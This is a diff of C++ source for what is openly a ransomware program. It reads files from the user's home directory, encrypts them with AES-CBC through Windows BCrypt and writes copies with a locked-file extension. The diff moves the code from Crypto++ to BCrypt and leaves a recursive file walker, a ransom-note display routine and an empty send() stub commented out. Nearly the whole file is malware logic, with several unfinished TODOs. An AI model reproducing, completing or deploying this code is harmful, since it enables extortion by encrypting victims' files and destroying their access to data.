@@ -2,189 +2,285 @@
 #include <string>
 #include <stdexcept>
 
-#include "Config.h"
+
+#include "config.h"
 #include "Encryption.h"
+#include <fstream>
 
 #ifdef _WIN32
 #	include <windows.h>
 #	include <Urlmon.h>
 #	include <Lmcons.h>
+#	include <winternl.h>
+#	include <ntstatus.h>
+#	include <winerror.h>
+#	include <bcrypt.h>
+#	include <cstdio>
+#	include <sal.h>
 #else
 #	include <pwd.h>
 #endif
 
-using namespace std;
-using namespace boost::filesystem;
-using namespace CryptoPP;
+//using namespace boost::filesystem;
+using std::string;
 
-void encrypt(const crypt_data* data, string path);
-crypt_data* generatekey();
-void iterate(const path& parent);
-void process(const path& path);
+//TODO change this salt!
+static const BYTE Salt[] =
+{
+	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+	0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
+};
+
+void encrypt(string path);
+
+//void iterate(const path& parent);
+//void process(const path& path);
 string get_username();
 string get_home();
 void send();
 void notify();
+DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
+size_t getFileSize(const string path);
 
 int main(int argc, char* argv[]) {
-	crypt_data* d = generatekey();
+//	crypt_data* d = generatekey();//TODO also move to encrypt
 
 #ifdef DEBUG
-	string path = ".";
+	string path = "c:\\rans\\236499\\Squanched\\Debug\\rans.txt";
 #else
 	string path = get_home();
 #endif
 
-	iterate(path);
+	encrypt(path);
+//	iterate(path);
 
-#ifdef DEBUG
-	cout << "Username: " << get_username() << endl;
-	encrypt(d, "./README.md");
-#endif
-
-	send();
-
-	delete d;
-
-	notify();
-
+//#ifdef DEBUG
+//	std::cout << "Username: " << get_username() << std::endl;
+//	encrypt(d, "./README.md");
+//#endif
+//
+//	send();
+//
+//	delete d;
+//
+//	notify();
+//
 	return 0;
 }
 
-void encrypt(const crypt_data* d, string path) {
+size_t getFileSize(const string path)
+{
+	std::ifstream plaintext;
+	plaintext.open(path,std::ios::binary);
+	if(!plaintext.is_open()) {
+		return 0;
+	}
+	plaintext.seekg(0, std::ios::end);
+	std::streampos plaintextLen = plaintext.tellg();
+	plaintext.close();
+	return plaintextLen;
+}
+
+DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
+{
+	DWORD status;
+	status = BCryptGenRandom(NULL, *iv, IV_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+	if(!NT_SUCCESS(status)) {
+		return status;
+	}
+	status = BCryptGenRandom(NULL, *key, KEY_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+	if (!NT_SUCCESS(status)) {
+		return status;
+	}
+	return status;
+}
+
+void encrypt(const string path) 
+{
+	DWORD status;
 	string cipher;
 	string plain;
 
-	FileSource(path.c_str(), true, new StringSink(plain));
+	size_t plainTextLen = getFileSize(path);
+	std::ifstream plaintextFile;
+	plaintextFile.open(path, std::ios::binary);
+	BYTE* plainText = new BYTE[plainTextLen];
+	char c;
+	for (size_t i = 0; i < plainTextLen; ++i) {
+		plaintextFile.get(c);
+		plainText[i] = c;
+	}
+	plaintextFile.close();
+
+	PBYTE iv =  (PBYTE)HeapAlloc(GetProcessHeap(),0,IV_LEN);
+	PBYTE key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
+
+	status = generateKeyAndIV(&iv, &key);
+	if(!NT_SUCCESS(status)) {
+		//TODO cleanup
+		std::cout << "key and IV set FAIL";//TODO remove if doesn't show
+	}
+	//keep in persistant file
+
+
 
 #ifdef DEBUG
 	// Print key and initialization vector
-	string skey;
-	StringSource(d->key, sizeof(d->key), true, new HexEncoder(new StringSink(skey)));
-	cout << "Key:\t\t" << skey << endl;
-	skey.clear();
+	std::cout << "Key:\t\t" << key << std::endl;
 
-	string siv;
-	StringSource(d->iv, sizeof(d->iv), true, new HexEncoder(new StringSink(siv)));
-	cout << "IV:\t\t" << siv << endl;
-	siv.clear();
+	std::cout << "IV:\t\t" << iv << std::endl;
 
-	cout << "Plaintext:\t" << plain << endl;
+	std::cout << "PALINTEXT LEN : \t\t" << plainTextLen << std::endl;
+
+	std::cout << "Plaintext:\t" <<(char*) plainText << std::endl;
 #endif
+	
 
-	CBC_Mode<AES>::Encryption e;
-	e.SetKeyWithIV(d->key, sizeof(d->key), d->iv);
 
-	StreamTransformationFilter filter(e);
-	filter.Put((const byte*)plain.data(), plain.size());
-	filter.MessageEnd();
+	//TODO get AES HANDLE , add CBC property, set KEY handle
+	BCRYPT_ALG_HANDLE aesHandle = nullptr;
+	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
+	if(!NT_SUCCESS(status)) {
+		//TODO cleanup
+	}
+	ULONG res;
+	char blockLen[50] ={0};
+	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50,&res, 0);
+	if (!NT_SUCCESS(status)) {
+		//TODO cleanup
+	}
+	//TODO verify compatible block length
+	BCRYPT_KEY_HANDLE keyHandle;
+	status = BCryptGenerateSymmetricKey(aesHandle, &keyHandle, NULL, 0, key, KEY_LEN, 0);
+	if (!NT_SUCCESS(status)) {
+		std::cout << "BAD KEY HANDLE" << std::endl;
+		//TODO cleanup
+	}
 
-	const size_t ret = filter.MaxRetrievable();
-	cipher.resize(ret);
-	filter.Get((byte*)cipher.data(), cipher.size());
+	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+	if (!NT_SUCCESS(status)) {
+		//TODO cleanup
+	}
+	DWORD cipherSize,resSize;
+	//CHECK IF NEEDED V
+	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+	if(NULL == tmpIv) {
+		//cleanup
+	}
+	memcpy(tmpIv, iv, IV_LEN);
+	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING);
+	if (!NT_SUCCESS(status)) {
+		//TODO cleanup
+	}
+
+	PBYTE cipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
+	if(NULL == cipherText) {
+		//cleanup
+	}
+	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, cipherText, cipherSize, &resSize, BCRYPT_BLOCK_PADDING);
 
 #ifdef DEBUG
-	string ciphertext;
-	StringSource(cipher, true, new HexEncoder(new StringSink(ciphertext)));
-	cout << "Ciphertext:\t" << ciphertext << endl;
+	std::cout << "Ciphertext:\t" << cipherText << std::endl;
 #endif
-
 	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
-	ofile.write(cipher.c_str(), cipher.length());
+	ofile.write((char*) cipherText, resSize);
 	ofile.close();
+
+	delete plainText;
+	//TODO CLEANUP!!!!!
 }
 
-crypt_data* generatekey() {
-	crypt_data* d = new crypt_data;
-
-	AutoSeededRandomPool prng;
-
-	prng.GenerateBlock(d->key, sizeof(d->key));
-	prng.GenerateBlock(d->iv, sizeof(d->iv));
-
-	return d;
-}
-
-void iterate(const path& parent) {
-	string path;
-	directory_iterator end_itr;
-
-	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
-		path = itr->path().string();
-
-		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
-			iterate(path);
-		}
-		else {
-			process(path);
-		}
-	}
-}
-
-void process(const path& path) {
-#ifdef DEBUG
-	cout << "Processing " << path << endl;
-#else
-	encrypt(path);
-#endif
-}
-
-string get_username() {
-#ifdef _WIN32
-	char username[UNLEN + 1];
-	DWORD length = UNLEN + 1;
-	GetUserName(username, &length);
-
-	return string(username);
-#else
-	struct passwd *pw;
-
-	uid_t uid = geteuid();
-	pw = getpwuid(uid);
-	if (pw) {
-		return string(pw->pw_name);
-	}
-
-	return EMPTY;
-#endif
-}
-
-string get_home() {
-#ifdef _WIN32
-	string path;
-
-	char* drive = getenv("USERPROFILE");
-	if (drive == NULL) {
-		throw runtime_error("USERPROFILE environment variable not found");
-	}
-	else {
-		path = drive;
-	}
-
-	return path;
-#else
-	struct passwd *pw;
-
-	uid_t uid = geteuid();
-	pw = getpwuid(uid);
-	if (pw) {
-		return string(pw->pw_dir);
-	}
-
-	return EMPTY;
-#endif
-}
-
-void notify() {
-	if (OPEN_FILE) {
-		std::ofstream ofile(NOTIFY_FILENAME);
-		ofile.write(NOTIFY_MESSAGE, sizeof(NOTIFY_MESSAGE));
-		ofile.close();
-
-		system((string("start ") + NOTIFY_FILENAME).c_str());
-	}
-}
-
-void send() {
-
-}
+//crypt_data* generatekey() {
+//	crypt_data* d = new crypt_data;
+//
+//	AutoSeededRandomPool prng;
+//
+//	prng.GenerateBlock(d->key, sizeof(d->key));
+//	prng.GenerateBlock(d->iv, sizeof(d->iv));
+//
+//	return d;
+//}
+//
+//void iterate(const path& parent) {
+//	string path;
+//	directory_iterator end_itr;
+//
+//	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
+//		path = itr->path().string();
+//
+//		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
+//			iterate(path);
+//		}
+//		else {
+//			process(path);
+//		}
+//	}
+//}
+//
+//void process(const path& path) {
+//#ifdef DEBUG
+//	cout << "Processing " << path << endl;
+//#else
+//	encrypt(path);
+//#endif
+//}
+//
+//string get_username() {
+//#ifdef _WIN32
+//	char username[UNLEN + 1];
+//	DWORD length = UNLEN + 1;
+//	GetUserName(username, &length);
+//
+//	return string(username);
+//#else
+//	struct passwd *pw;
+//
+//	uid_t uid = geteuid();
+//	pw = getpwuid(uid);
+//	if (pw) {
+//		return string(pw->pw_name);
+//	}
+//
+//	return EMPTY;
+//#endif
+//}
+//
+//string get_home() {
+//#ifdef _WIN32
+//	string path;
+//
+//	char* drive = getenv("USERPROFILE");
+//	if (drive == NULL) {
+//		throw runtime_error("USERPROFILE environment variable not found");
+//	}
+//	else {
+//		path = drive;
+//	}
+//
+//	return path;
+//#else
+//	struct passwd *pw;
+//
+//	uid_t uid = geteuid();
+//	pw = getpwuid(uid);
+//	if (pw) {
+//		return string(pw->pw_dir);
+//	}
+//
+//	return EMPTY;
+//#endif
+//}
+//
+//void notify() {
+//	if (OPEN_FILE) {
+//		std::ofstream ofile(NOTIFY_FILENAME);
+//		ofile.write(NOTIFY_MESSAGE, sizeof(NOTIFY_MESSAGE));
+//		ofile.close();
+//
+//		system((string("start ") + NOTIFY_FILENAME).c_str());
+//	}
+//}
+//
+//void send() {
+//
+//}
